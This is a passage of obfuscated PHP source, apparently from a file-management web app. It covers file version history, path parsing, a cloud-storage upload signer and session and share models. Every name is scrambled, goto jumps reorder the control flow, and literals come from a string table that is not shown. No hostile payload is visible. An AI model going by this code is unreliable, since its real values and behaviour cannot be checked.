(!IO::exist($FԈ)) { $FԈ .= $_SERVER[̉][1117]; } return IO::exist($FԈ) ? IO::info($FԈ) : !1; } private static function parsePath($C) { goto a; a: $a =& $_SERVER[̉]; if (!$C) { return !1; } if ($GLOBALS[$a[1118]]) { return; } goto C芐; b: if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $F褼 = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $a[1121]); foreach ($F褼 as $F󙌗ә) { if (!$d㍶ && substr($C, 0, strlen($F󙌗ә)) == $F󙌗ә) { return !1; } } goto d; d: self::log($GLOBALS[$a[1042]] . $a[1122] . $C); return $C; goto BȠ; A֑: if (!$dĢ || !$E˫[$a[1119]]) { return !1; } if (substr($C, 0, strlen(DATA_PATH . $a[1120])) == DATA_PATH . $a[1120]) { return !1; } if ($d㍶ == KodIO::KOD_SHARE_ITEM) { $eྗ = IO::init($C); if ($eྗ->pathParse[$a[1047]]) { return self::parsePath($eྗ->pathParse[$a[1047]]); } return !1; } goto b; C芐: $E˫ = KodIO::parse($C); $d㍶ = $E˫[$a[29]]; $dĢ = !$d㍶ || $d㍶ == KodIO::KOD_IO || $d㍶ == KodIO::KOD_SHARE_ITEM; goto A֑; BȠ: } private static function pathHistory($B̝) { $E雷 =& $_SERVER[̉]; $Dϐ = self::$_historyBase . ltrim(KodIO::clear($B̝), $E雷[8]); $Dϐ = str_replace(array($E雷[1123]), array($E雷[1124]), $Dϐ); return $Dϐ; } public static function log($F) { } public static function historyCount($a) { $FםѨ =& $_SERVER[̉]; $dķ = array(); $D򆅕 = array(); foreach ($a as $B«) { $aޠ = get_path_father($B«); if (!$D򆅕[$aޠ]) { $D򆅕[$aޠ] = array(); } $D򆅕[$aޠ][] = get_path_this($B«); } foreach ($D򆅕 as $aޠ => $f󹖌) { $C = self::parsePath($aޠ); if (!$C) { continue; } foreach ($f󹖌 as $b԰) { $Fט = self::listData(rtrim($C, $FםѨ[8]) . $FםѨ[8] . $b԰, !1); if ($Fט && $Fט[$FםѨ[367]]) { $dķ[rtrim($aޠ, $FםѨ[8]) . $FםѨ[8] . $b԰] = count($Fט[$FםѨ[367]]); } } } return $dķ; } public static function add($f) { goto A ; Eʳ: if ($BȞ <= 0) { return; } $dҡ = IO::hashSimple($f); $c愼 = IO::info($f); goto aߠֻ; A֌: return self::saveData($fؠ[$c[1130]], $fɉ); goto Eɴ; A : $c =& $_SERVER[̉]; $fؠ = self::listData($f); if (!$fؠ) { return; } goto d͡; CѨ: if ($fɉ && $fɉ[0][$c[171]] == $dҡ) { return !0; } if (array_key_exists($c[196], $c愼) && !$c愼[$c[196]]) { return !1; } $dڥ = short_id(time()); goto B; d͡: $eΞդ = Model($c[733])->get($c[1125]); $BȞ = $GLOBALS[$c[6]][$c[88]][$c[1103]]; $B͘ = $eΞդ == $c[1126] ? 5 : $BȞ; goto Eʳ; B: $bԨԠ = array($c[393] => $dڥ, $c[171] => $dҡ, $c[28] => $c愼[$c[28]] . $c[95] . date($c[1127]) . rand_string(1), $c[78] => $c愼[$c[78]], $c[432] => USER_ID, $c[194] => time(), $c[1128] => $c[33]); IO::mkdir($fؠ[$c[1129]]); $EƐ = IO::copy($f, $fؠ[$c[1129]], !1, $bԨԠ[$c[28]]); goto b쌂; b쌂: if (!$EƐ) { self::clearEmptyFolder($fؠ[$c[1129]]); return !1; } array_unshift($fɉ, $bԨԠ); if (count($fɉ) > $B͘) { $eنҵ = array_slice($fɉ, $B͘); foreach ($eنҵ as $a) { IO::remove($fؠ[$c[1129]] . $a[$c[28]]); } $fɉ = array_slice($fɉ, 0, $B͘); } goto A֌; aߠֻ: $fɉ = $fؠ[$c[367]]; if ($c愼[$c[78]] == 0) { return; } if ($c愼[$c[78]] >= 1024 * 1024 * 500) { return !1; } goto CѨ; Eɴ: } public static function remove($bڗ, $aͣ) { $aІ =& $_SERVER[̉]; $C = self::listData($bڗ); $e뎹 = array(); if (!$C) { return !1; } foreach ($C[$aІ[367]] as $Dꆸ) { if ($Dꆸ[$aІ[393]] == $aͣ) { IO::remove($C[$aІ[1129]] . $Dꆸ[$aІ[28]]); continue; } $e뎹[] = $Dꆸ; } return self::saveData($C[$aІ[1130]], $e뎹); } public static function clear($Aݺ, $B = true) { $d͠ =& $_SERVER[̉]; $cܶ = self::listData($Aݺ, $B); if (!$cܶ) { return !1; } foreach ($cܶ[$d͠[367]] as $F͙) { IO::remove($cܶ[$d͠[1129]] . $F͙[$d͠[28]]); } return self::saveData($cܶ[$d͠[1130]], array()); } public static function moveHistory($eԂ, $Bܴۘ = '', $Cݡ = '') { goto d; bǬ۪: $CƂٻ = substr(get_path_this($c뺱[$cݙÓ[1130]]), 0, -strlen($e)); foreach ($c뺱[$cݙÓ[367]] as $c => $FܜΌ) { $aՋ = $Bܴۘ . substr($FܜΌ[$cݙÓ[28]], strlen($CƂٻ)); $e = IO::move($c뺱[$cݙÓ[1129]] . $FܜΌ[$cݙÓ[28]], $Cݡ, !1, $aՋ); if ($e) { $c뺱[$cݙÓ[367]][$c][$cݙÓ[28]] = $aՋ; } } $c뺱[$cݙÓ[1130]] = IO::move($c뺱[$cݙÓ[1130]], $Cݡ, !1, $Bܴۘ . $e); goto C͋; d: $cݙÓ =& $_SERVER[̉]; $c뺱 = self::listData($eԂ, !1); if (!$c뺱 || !$c뺱[$cݙÓ[367]]) { return !1; } goto C; C: $e = $cݙÓ[1117]; $Bܴۘ = $Bܴۘ ? $Bܴۘ : get_path_this($eԂ); $Cݡ = $Cݡ ? $Cݡ : $c뺱[$cݙÓ[1129]]; goto bǬ۪; C͋: self::saveData($c뺱[$cݙÓ[1130]], $c뺱[$cݙÓ[367]]); self::clearEmptyFolder($c뺱[$cݙÓ[1129]]); goto a; a: } public static function rollback($E, $cȘ) { $eۊ잫 =& $_SERVER[̉]; $Aߛ = self::listData($E); if (!$Aߛ) { return; } $D󈬗 = IO::info($E); foreach ($Aߛ[$eۊ잫[367]] as $B؋紻 => $F) { if ($F[$eۊ잫[393]] == $cȘ) { self::add($E); $Bў = $Aߛ[$eۊ잫[1129]] . $F[$eۊ잫[28]]; $d = IO::copy($Bў, IO::pathFather($E), REPEAT_REPLACE, $D󈬗[$eۊ잫[28]]); if ($d) { self::remove($E, $cȘ); } return $d; } } return !1; } public static function setDetail($Dё, $DۉÊ, $aֆ) { $A׃ =& $_SERVER[̉]; $B΂ʟ = self::listData($Dё); if (!$B΂ʟ) { return; } foreach ($B΂ʟ[$A׃[367]] as $d => $FȨ) { if ($FȨ[$A׃[393]] == $DۉÊ) { $B΂ʟ[$A׃[367]][$d][$A׃[1128]] = $aֆ; self::saveData($B΂ʟ[$A׃[1130]], $B΂ʟ[$A׃[367]]); return !0; } } return !1; } public static function fileInfo($DˆͶ, $C֊) { goto C; F덚: return IO::info($aɣ); goto Fבǋ; eȸ: $aɣ = $c[33]; foreach ($a[$c[367]] as $Bѣ => $E҈) { if ($E҈[$c[393]] != $C֊) { continue; } $aɣ = $a[$c[1129]] . $E҈[$c[28]]; break; } if (!$aɣ) { show_json(LNG($c[105]), !1); } goto F덚; C: $c =& $_SERVER[̉]; $a = self::listData($DˆͶ); if (!$a) { show_json(LNG($c[105]), !1); } goto eȸ; Fבǋ: } public static function fileOut($D❶, $b򠍐, $a = false) { $A埘 =& $_SERVER[̉]; $c͉Ğ = self::fileInfo($D❶, $b򠍐); $fφ =& $GLOBALS[$A埘[7]]; $a = isset($fφ[$A埘[1093]]) && $fφ[$A埘[1093]] == 1; if (isset($fφ[$A埘[29]]) && $fφ[$A埘[29]] == $A埘[1131]) { return IO::fileOutImage($c͉Ğ[$A埘[76]], $fφ[$A埘[1132]]); } IO::fileOut($c͉Ğ[$A埘[76]], $a, get_path_this($D❶)); } public static function listData($b, $D = true) { goto cɃچ; DŽɚ֛: $Aȟ = IO::getContent($Eׯ[$Eε[1130]]); if ($Aȟ) { $F = json_decode($Aȟ, !0); if (is_array($F)) { $Eׯ[$Eε[367]] = $F; } } return $Eׯ; goto Fې; B݉: if (substr($b, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $bϚ񳌧 = self::pathHistory($b); $Eׯ = array($Eε[1130] => $bϚ񳌧 . $Eε[1117], $Eε[1129] => rtrim(get_path_father($bϚ񳌧), $Eε[8]) . $Eε[8], $Eε[367] => array()); goto DŽɚ֛; cɃچ: $Eε =& $_SERVER[̉]; if ($D && !IO::exist($b)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto B݉; Fې: } private static function saveData($b, $C芌) { goto D; F: $bܶ = IO::pathFather($b); IO::remove($b); self::clearEmptyFolder($bܶ); goto f̏; D: $f =& $_SERVER[̉]; self::log($f[1133] . $b . $f[68] . count($C芌), $f[715]); if ($C芌) { return IO::setContent($b, json_encode($C芌)); } goto F; f̏: return !0; goto e՝ƙ; e՝ƙ: } public static function clearEmptyFolder($Bɨ׈) { goto bĴ; bɷ: $AÕ = IO::has($Bɨ׈, !0); if ($AÕ[$B[203]] > 0 || $AÕ[$B[204]] > 0) { return; } IO::remove($Bɨ׈); goto eՕ; bĴ: $B =& $_SERVER[̉]; if (trim($Bɨ׈, $B[8]) == trim(self::$_historyBase, $B[8])) { return; } $aϐ = IO::pathFather($Bɨ׈); goto bɷ; eՕ: self::clearEmptyFolder($aϐ); goto e؇; e؇: } private static function getBasePath() { goto dʮ; e赱ꑷ: return $a٤; goto A; c튓: file_put_contents($a٤ . $eҴ[1137], $eҴ[33]); file_put_contents(DATA_PATH . $eҴ[1137], $eҴ[33]); Model($eҴ[1134])->set($eҴ[1135], $a٤); goto e赱ꑷ; dʮ: $eҴ =& $_SERVER[̉]; $a٤ = Model($eҴ[1134])->get($eҴ[1135]); if ($a٤ && IO::exist($a٤)) { if (get_path_this($a٤) == $eҴ[1120]) { $cҳ¨ = $eҴ[1136] . rand_string(8); @rename($a٤, get_path_father($a٤) . $eҴ[8] . $cҳ¨); $a٤ = DATA_PATH . $cҳ¨ . $eҴ[8]; file_put_contents(DATA_PATH . $eҴ[1137], $eҴ[33]); Model($eҴ[1134])->set($eҴ[1135], $a٤); } return $a٤; } goto dب; dب: $a٤ = DATA_PATH . $eҴ[1136] . rand_string(8) . $eҴ[8]; $a٤ = IO::mkdir($a٤); $a٤ = rtrim($a٤, $eҴ[8]) . $eҴ[8]; goto c튓; A: } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\165\162\x63\x65\175"; const KOD_USER_RECYCLE = "\173\165\x73\145\162\x52\x65\x63\171\x63\x6c\x65\175"; const KOD_USER_FAV = "\x7b\x75\x73\x65\x72\x46\141\x76\175"; const KOD_USER_FILE_TAG = "\173\x75\x73\145\x72\106\151\154\145\x54\141\147\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\145\162\106\151\154\x65\124\x79\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\x75\160\122\157\157\x74\123\145\154\146\x7d"; const KOD_USER_SHARE = "\173\x75\x73\145\162\123\x68\141\162\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\145\x72\x53\150\x61\162\x65\114\x69\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\173\163\150\141\162\145\x54\x6f\115\145\175"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\x72\145\111\164\x65\x6d\175"; const KOD_SHARE_LINK = "\173\163\x68\x61\x72\145\111\164\x65\x6d\114\151\x6e\153\175"; const KOD_SEARCH = "\173\163\145\141\x72\x63\150\x7d"; const KOD_BLOCK = "\x7b\142\154\x6f\x63\153\175"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\173\x75\163\145\x72\122\x65\x6e\143\x65\x6e\x74\175"; const KOD_USER_DRIVER = "\173\144\x72\151\x76\x65\x72\x7d"; public static function typeList() { $E뢘 =& $_SERVER[̉]; return array($E뢘[1138] => self::KOD_SOURCE, $E뢘[1139] => self::KOD_USER_RECYCLE, $E뢘[1140] => self::KOD_USER_FAV, $E뢘[1141] => self::KOD_USER_FILE_TAG, $E뢘[1142] => self::KOD_USER_FILE_TYPE, $E뢘[1143] => self::KOD_GROUP_ROOT_SELF, $E뢘[1144] => self::KOD_USER_SHARE, $E뢘[1145] => self::KOD_USER_SHARE_LINK, $E뢘[1146] => self::KOD_USER_SHARE_TO_ME, $E뢘[1147] => self::KOD_SHARE_ITEM, $E뢘[1148] => self::KOD_SHARE_LINK, $E뢘[1149] => self::KOD_SEARCH, $E뢘[1150] => self::KOD_BLOCK, $E뢘[1151] => self::KOD_IO, $E뢘[1152] => self::KOD_USER_RECENT, $E뢘[1153] => self::KOD_USER_DRIVER); } public static function parse($Dӈ) { goto d𼡿; cˈݴ: $cۓ = array($C[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Cɏ[$C[1119]] = in_array($Cɏ[$C[29]], $cۓ); return $Cɏ; goto d٠; C: preg_match($C[1154], $Dӈ, $b犦ߌ); $Cɏ = array($C[415] => !1, $C[1155] => !1, $C[412] => !1, $C[76] => $Dӈ, $C[1064] => !1, $C[1063] => $C[33]); if (is_array($b犦ߌ) && count($b犦ߌ) == 5) { $bޗߒ = $C[1156] . $b犦ߌ[2] . $C[325]; if (in_array($bޗߒ, $dޢ)) { $Cɏ[$C[1064]] = $b犦ߌ[1]; $Cɏ[$C[29]] = $bޗߒ; $Cɏ[$C[1157]] = substr($bޗߒ, 1, -1); $Cɏ[$C[393]] = $b犦ߌ[3]; } $Cɏ[$C[1063]] = $b犦ߌ[4]; } goto cˈݴ; d𼡿: $C =& $_SERVER[̉]; $Dӈ = self::clear($Dӈ); $dޢ = array_values(self::typeList()); goto C; d٠: } public static function isTruePath($f) { goto b; C̻: if (strpos($f, $cԷ[1123]) === 0) { return !0; } if (strpos($f, $cԷ[1158]) === 0) { return !0; } if (strpos($f, $cԷ[1159]) === 0) { return !0; } goto b틚; b: $cԷ =& $_SERVER[̉]; if (substr($f, 0, 1) != $cԷ[1156]) { return !0; } if (strpos($f, $cԷ[401]) === 0) { return !0; } goto C̻; b틚: if (strpos($f, $cԷ[1160]) === 0) { return !0; } return !1; goto CŅ; CŅ: } public static function clear($fˇ) { goto eߦ򛇰; F: $Cצ = $E[1161]; if (substr($fˇ, 0, 3) == $E[1162]) { $fˇ = substr($fˇ, 3); } while (strstr($fˇ, $Cצ)) { $fˇ = str_replace($Cצ, $E[8], $fˇ); } goto A; A: $fˇ = preg_replace($E[1163], $E[8], $fˇ); if ($fˇ == $E[8]) { return $E[8]; } $fˇ = rtrim($fˇ, $E[8]); goto b؏; eߦ򛇰: $E =& $_SERVER[̉]; $fˇ = str_replace(array($E[1037], $E[229]), $E[50], $fˇ); $fˇ = str_replace($E[97], $E[8], $fˇ); goto F; b؏: return $fˇ; goto A׷; A׷: } public static function sourceID($fلҴ) { $aڸ =& $_SERVER[̉]; $E婶 = self::parse($fلҴ); if ($E婶[$aڸ[29]] !== self::KOD_SOURCE) { show_json(LNG($aڸ[1164]), !1); } return $E婶[$aڸ[393]]; } public static function make($d横) { if (!$d横) { return !1; } return self::makePath(self::KOD_SOURCE, intval($d横)); } public static function makeShare($cԃ, $E߂) { return self::makePath(self::KOD_SHARE_ITEM, $cԃ, $E߂); } public static function makeFileTypePath($A轸) { return self::makePath(self::KOD_USER_FILE_TYPE, $A轸); } public static function makeFileTagPath($d䂘) { return self::makePath(self::KOD_USER_FILE_TAG, $d䂘); } public static function makePath($b֋, $b̟ = '', $D = '') { $a㆒ڇ =& $_SERVER[̉]; $A = substr($b֋, 1, -1); $AƖ = $a㆒ڇ[1165] . $A . $a㆒ڇ[1166] . $b̟ . $a㆒ڇ[1167]; $AƖ = $D ? $AƖ . $D . $a㆒ڇ[8] : $AƖ; return $AƖ; } public static function hashPath($Dԩ, $eۿس = true) { goto c웞; C͕Ė: return $dͽҪ; goto Dӓ; c웞: $C =& $_SERVER[̉]; $cӐ = is_array($Dԩ) ? $Dԩ : IO::info($Dԩ); $dͽҪ = _get($cӐ, $C[1168], $C[33]); goto F; F: if (!$dͽҪ && isset($cӐ[$C[395]])) { $cӐ = IO::info(KodIO::make($cӐ[$C[395]])); $dͽҪ = _get($cӐ, $C[1168], $C[33]); } if (!$dͽҪ && $eۿس) { $AҮ = KodIO::parse($cӐ[$C[76]]); if (!$AҮ[$C[29]]) { $dͽҪ = IO::hashSimple($cӐ[$C[76]]); } } if (!$dͽҪ) { $dͽҪ = md5($cӐ[$C[76]] . $cӐ[$C[78]] . $cӐ[$C[84]]); } goto C͕Ė; Dӓ: } public static function initSystemPath() { goto C֝샧; Aۊ: IOHistory::bindEvent(); goto A; dڐ: define($EҢٵ[1171], self::systemPath($EҢٵ[1172])); define($EҢٵ[1173], self::systemPath($EҢٵ[1174])); define($EҢٵ[1175], self::systemPath($EҢٵ[1176])); goto Aۊ; C֝샧: $EҢٵ =& $_SERVER[̉]; if (defined($EҢٵ[1169])) { return; } define($EҢٵ[1169], self::systemPath($EҢٵ[1170])); goto dڐ; A: } public static function systemPath($d) { goto aà𺋻; e쉲ܞ: if ($Fǆ) { return $Fǆ; } if ($d == $e򆂂[1170]) { $Fǆ = self::make(Model($e򆂂[793])->systemRootPathAdd($e򆂂[505])); } else { $Fǆ = self::systemPath($e򆂂[1170]); $d󟛘 = self::sourceID($Fǆ); $Fǆ = self::make(Model($e򆂂[793])->mkdir($d󟛘, $d)); } Model($e򆂂[733])->set($bռ, $Fǆ); goto e; aà𺋻: $e򆂂 =& $_SERVER[̉]; $bռ = $e򆂂[1177] . ucfirst($d); $Fǆ = Model($e򆂂[733])->get($bռ); goto e쉲ܞ; e: return $Fǆ; goto a; a: } public static function systemFolder($dҷ٘) { $BĠˎ = IO_PATH_SYSTEM_SOURCE . $dҷ٘; $c = Cache::get($BĠˎ); if (!$c) { $bǐ = IO::infoFull($BĠˎ); if (!$bǐ) { $c = IO::mkdir($BĠˎ, REPEAT_SKIP); } else { $c = $bǐ[$_SERVER[̉][76]]; } Cache::set($BĠˎ, $c, 3600 * 10); } return $c; } public static function defaultDriver() { return Model($_SERVER[̉][730])->defaultDriver(); } public static function defaultIO() { $aډ =& $_SERVER[̉]; $a펆 = self::defaultDriver(); return $aډ[1178] . $a펆[$aډ[393]] . $aډ[1167]; } public static function defaultDriverInit() { static $DȌ = false; if ($DȌ) { return $DȌ; } $DȌ = IO::init(self::defaultIO()); return $DȌ; } public static function fileTypeList() { $C =& $_SERVER[̉]; $fߎ֊ = $GLOBALS[$C[6]][$C[1179]]; foreach ($fߎ֊ as $dҳ => $B) { $Aȃ = $C[1180] . $dҳ; $dЌ = LNG($Aȃ); if ($Aȃ != $dЌ) { $fߎ֊[$dҳ][$C[28]] = $dЌ; } } return $fߎ֊; } public static function transferType($D̂, $aޟ) { goto Cۛᒾ; cȭެ: if ($eɵק[$cԗ[29]] == $fҌ[$cԗ[29]] && $eɵק[$cԗ[1181]] == $fҌ[$cԗ[1181]]) { return $cԗ[1182]; } if ($eɵק[$cԗ[29]] == $cԗ[826] && $fҌ[$cԗ[29]] == $cԗ[106]) { return $cԗ[1093]; } if ($eɵק[$cԗ[29]] == $cԗ[106] && $fҌ[$cԗ[29]] == $cԗ[826]) { return $cԗ[107]; } goto E; E: return $cԗ[1183]; goto F; Cۛᒾ: $cԗ =& $_SERVER[̉]; $eɵק = self::driverType($D̂); $fҌ = self::driverType($aޟ); goto cȭެ; F: } public static function driverType($eא) { goto eڦ; eڦ: $c¯ =& $_SERVER[̉]; $c = $eא->path; $B = str_replace($c¯[1184], $c¯[33], strtolower($eא->getType())); goto dֈȯ܋; dֈȯ܋: if ($B == $c¯[721] || $B == $c¯[1185] || $B == $c¯[1186]) { $eא = self::defaultDriverInit(); } else { if ($B == $c¯[1100] || $B == $c¯[1187]) { $eא = IO::init($eא->pathParse[$c¯[1047]]); } } $B = str_replace($c¯[1184], $c¯[33], strtolower($eא->getType())); if ($B == $c¯[106]) { return array($c¯[29] => $c¯[106], $c¯[1181] => $c¯[33], $c¯[76] => $c); } goto eۨ; eۨ: return array($c¯[29] => $c¯[826], $c¯[1181] => $eא->pathDriver, $c¯[76] => $c); goto B; B: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($d䫃΃) { parent::__construct($d䫃΃); $this->signatureVersion($_SERVER[̉][212]); } public function uploadFormData($C, $dˈԊ = 3600) { goto dȉ; c: return $Bְ; goto fś; dȉ: $Dؓ =& $_SERVER[̉]; $F = $Dؓ[192]; $Bʌ = $Dؓ[230]; goto C; F􊔐: $Aקݵ = sha1($C); $dѬ = hash_hmac($Dؓ[230], $Aקݵ, $fޥט); $Bְ = array($Dؓ[1192] => $F, $Dؓ[1196] => $Bӈ̑, $Dؓ[1200] => base64_encode($C), $Dؓ[1197] => $Bʌ, $Dؓ[1198] => $this->accessKey, $Dؓ[1201] => $b, $Dؓ[1202] => $dѬ, $Dؓ[175] => $this->getHost()); goto c; C: $Bӈ̑ = $Dؓ[1188]; $a = gmdate($Dؓ[1189], time() + $dˈԊ); $b = (string) time() . $Dؓ[68] . (string) (time() + $dˈԊ); goto Cğ; Cğ: $C = array($Dؓ[1190] => $a, $Dؓ[1191] => array(array($Dؓ[1192] => $F), array($Dؓ[1193] => $this->bucket), array($Dؓ[1194], $Dؓ[1195], $Dؓ[33]), array($Dؓ[1196] => $Bӈ̑), array($Dؓ[1197] => $Bʌ), array($Dؓ[1198] => $this->accessKey), array($Dؓ[1199] => $b))); $C = json_encode($C); $fޥט = hash_hmac($Dؓ[230], $b, $this->secret); goto F􊔐; fś: } public function fileOutLink($aݾ) { $b =& $_SERVER[̉]; if (substr($aݾ, 0, 7) == $b[1203]) { $aݾ = $b[1204] . substr($aݾ, 7); } header($b[159] . $aݾ); die; } } goto Fͅϩ; d: class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\x65\155\x5f\163\x65\x73\x73\x69\157\156"; public function get($F˼) { $Cϸ =& $_SERVER[̉]; $f̨ = $this->where(array($Cϸ[1819] => $F˼))->find(); if (!is_array($f̨)) { return !1; } return $f̨[$Cϸ[718]]; } public function set($b߽׷, $dκږ, $dނ = 3600) { $bӂ =& $_SERVER[̉]; $d͛ = array($bӂ[1819] => $b߽׷, $bӂ[1728] => $dκږ, $bӂ[1820] => $dނ + time()); if (Session::get($bӂ[1821])) { $d͛[$bӂ[1531]] = Session::get($bӂ[1821]); } else { $d͛[$bӂ[1531]] = 0; } if ($this->get($b߽׷)) { return $this->where(array($bӂ[1819] => $b߽׷))->save($d͛); } else { return $this->add($d͛, array(), !0); } } public function remove($B) { return $this->where(array($_SERVER[̉][1819] => $B))->delete(); } public function clearTimeout() { return $this->where($_SERVER[̉][1822] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\162\x65"; protected $dataAuto = array(array("\x6d\157\144\151\x66\171\124\151\x6d\x65", "\x74\151\155\145", "\151\x6e\163\x65\162\164\x2c\x75\160\x64\141\x74\x65", "\x66\x75\x6e\143\164\151\x6f\156"), array("\x63\x72\145\141\x74\x65\124\151\x6d\145", "\x74\151\x6d\145", "\x69\156\163\x65\x72\164", "\146\165\x6e\143\164\x69\x6f\x6e"), array("\x6f\160\164\151\157\x6e\163", '', "\x69\156\163\145\162\164\54\165\x70\x64\x61\x74\x65\54\163\145\x6c\145\x63\x74", "\152\163\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($C܋) { $cՊ =& $_SERVER[̉]; $CŽ = isset($C܋[0]) ? $C܋[0] : !1; return array($cՊ[1823] => array(USER_ID, $cՊ[1824]), $cՊ[1767] => array($CŽ, $cՊ[1825])); } protected function listSimple() { $Bߧ = array($_SERVER[̉][1531] => USER_ID); $e騅 = $this->field($this->fieldList)->where($Bߧ)->select(); return $e騅 ? $e騅 : array(); } protected function getInfo($Fɍ, $aƃ = false) { $EϏҬ =& $_SERVER[̉]; if ($aƃ) { return $this->_getShareInfo(array($EϏҬ[468] => $Fɍ)); } $A = $this->cacheFunctionGet($EϏҬ[1774], $Fɍ); return $A; } public function getInfoByHash($aяԻ) { return $this->_getShareInfo(array($_SERVER[̉][470] => $aяԻ)); } public function getInfoByPath($a¹ح) { $B駏 =& $_SERVER[̉]; $EО = array($B駏[1531] => USER_ID, $B駏[395] => $a¹ح); return $this->_getShareInfo($EО); } public function getInfoBySourcePath($F) { $Cҿ =& $_SERVER[̉]; $Cƃ = array($Cҿ[1531] => USER_ID, $Cҿ[1070] => $F); return $this->_getShareInfo($Cƃ); } private function _getShareInfo($Bܑ㠩) { goto B; bϧ: if ($e[$fæ[395]] == $fæ[191]) { $e[$fæ[85]] = IO::info($e[$fæ[1070]]); } else { $e[$fæ[85]] = Model($fæ[1205])->pathInfo($e[$fæ[395]]); } $e[$fæ[1827]] = $cŦ; return $e; goto D㜲; B: $fæ =& $_SERVER[̉]; $e = $this->where($Bܑ㠩)->find(); if (!$e) { return !1; } goto Cٳؙ; Cٳؙ: $Bܑ㠩 = array($fæ[468] => $e[$fæ[468]]); $Dݖ = $fæ[1826]; $cŦ = Model($fæ[564])->order($fæ[393])->field($Dݖ)->where($Bܑ㠩)->select(); goto bϧ; D㜲: } protected function getInfoAuth($Dɟ) { $cп =& $_SERVER[̉]; $E = $this->getInfo($Dɟ); $E[$cп[406]] = Model($cп[482])->authMake($E[$cп[1827]]); return $E; } protected function listData($Cؠӥ = null, $fՉ = 300) { $cﻻ =& $_SERVER[̉]; $Aᱨ = array(array($cﻻ[473] => array($cﻻ[968], 0), $cﻻ[475] => array($cﻻ[968], 0), $cﻻ[1828] => $cﻻ[1782])); if ($Cؠӥ == $cﻻ[1829]) { $Aᱨ = array($cﻻ[473] => 1); } else { if ($Cؠӥ == $cﻻ[1055]) { $Aᱨ = array($cﻻ[475] => 1); } } $Aᱨ[$cﻻ[1531]] = USER_ID; $C툚 = $this->where($Aᱨ)->selectPage($fՉ); return $C툚; } protected function listToMe($f = 300) { goto fۂ; Eɏ: $dӘ = $this->field($D̸י)->where($C􌃳)->select(); foreach ($dӘ as $E => &$Că) { $Că[$dޑ[1827]] = $cԌ[$Că[$dޑ[468]]]; } unset($Că); goto e׋; e׋: $E֠ = array($dޑ[1832] => $dӘ, $dޑ[1833] => $CȘ[$dޑ[364]]); return $E֠; goto C; fĚ: if (!$cԌ) { return $CȘ; } $D̸י = $dޑ[1831]; $C􌃳 = array($dޑ[468] => array($dޑ[411], array_keys($cԌ))); goto Eɏ; fۂ: $dޑ =& $_SERVER[̉]; $c = Model($dޑ[1830])->userGroupParents(USER_ID); $C􌃳 = array($dޑ[549] => SourceModel::TYPE_USER, $dޑ[484] => USER_ID); goto a譄; a譄: if ($c) { $C􌃳 = array(array($dޑ[549] => SourceModel::TYPE_USER, $dޑ[484] => USER_ID), array($dޑ[549] => SourceModel::TYPE_GROUP, $dޑ[484] => array($dޑ[7], $c)), $dޑ[1828] => $dޑ[1782]); } $CȘ = Model($dޑ[564])->where($C􌃳)->selectPage($f); $cԌ = array_to_keyvalue_group($CȘ[$dޑ[367]], $dޑ[468]); goto fĚ; C: } protected function shareAdd($Eé, $bیٰ) { $C؍ =& $_SERVER[̉]; $bѳ = $this->_addShareData($Eé, $bیٰ); if (!empty($bیٰ[$C؍[1834]])) { $this->_shareAuthSet($bѳ, $bیٰ[$C؍[1834]]); } $this->shareEventAdd($Eé, $bیٰ, $C؍[1058]); return $bѳ; } private function shareEventAdd($aۭӜ, $B, $d = "\x61\144\x64") { goto Dׄ; B: $F = $this->getInfoByPath($aۭӜ); $DӲ = $F˝[1837]; if ($F[$F˝[473]] == $F˝[191] && $B[$F˝[473]] == $F˝[87]) { $DӲ = $F˝[1835]; } goto bޔ򞰚; Dׄ: $F˝ =& $_SERVER[̉]; if (!$aۭӜ || $aۭӜ == $F˝[191]) { return; } if ($d == $F˝[1058]) { if ($B[$F˝[473]] == $F˝[87]) { Model($F˝[533])->eventShare($aۭӜ, $F˝[1835]); } if ($B[$F˝[475]] == $F˝[87]) { Model($F˝[533])->eventShare($aۭӜ, $F˝[1836]); } return; } goto B; e: Model($F˝[533])->eventShare($aۭӜ, $DӲ); return; goto E׊; bޔ򞰚: if ($F[$F˝[473]] == $F˝[87] && $B[$F˝[473]] == $F˝[191]) { $DӲ = $F˝[1838]; } if ($F[$F˝[475]] == $F˝[191] && $B[$F˝[475]] == $F˝[87]) { $DӲ = $F˝[1836]; } if ($F[$F˝[475]] == $F˝[87] && $B[$F˝[475]] == $F˝[191]) { $DӲ = $F˝[1839]; } goto e; E׊: } private function _addShareData($D, $F = array()) { goto Fʾ; E˿: $Dﶂ = array($bԭ[1523] => USER_ID, $bԭ[410] => $D, $bԭ[1435] => $bԭ[33], $bԭ[473] => 0, $bԭ[475] => 0, $bԭ[1070] => $bԭ[33], $bԭ[305] => $bԭ[33], $bԭ[848] => $bԭ[33], $bԭ[1841] => 0, $bԭ[1842] => 0, $bԭ[476] => 0, $bԭ[477] => $bԭ[33], $bԭ[470] => $bԭ[33]); $d = explode($bԭ[47], $bԭ[1843]); foreach ($d as $f) { if (!isset($F[$f])) { continue; } $Dﶂ[$f] = $F[$f]; } goto cԋ߸; Fʾ: $bԭ =& $_SERVER[̉]; $bӨ = array($bԭ[410] => $D, $bԭ[1523] => USER_ID); if ($D == 0) { $bӨ = array($bԭ[1840] => $F[$bԭ[1070]], $bԭ[1523] => USER_ID); } goto eٔˎƋ; cԋ߸: $D֨ = $this->add($Dﶂ); $B屮 = array($bԭ[470] => short_id($D֨)); $this->where(array($bԭ[467] => $D֨))->save($B屮); goto E؊؎; E؊؎: return $D֨; goto b; eٔˎƋ: if ($eʝ = $this->where($bӨ)->find()) { return $eʝ[$bԭ[468]]; } 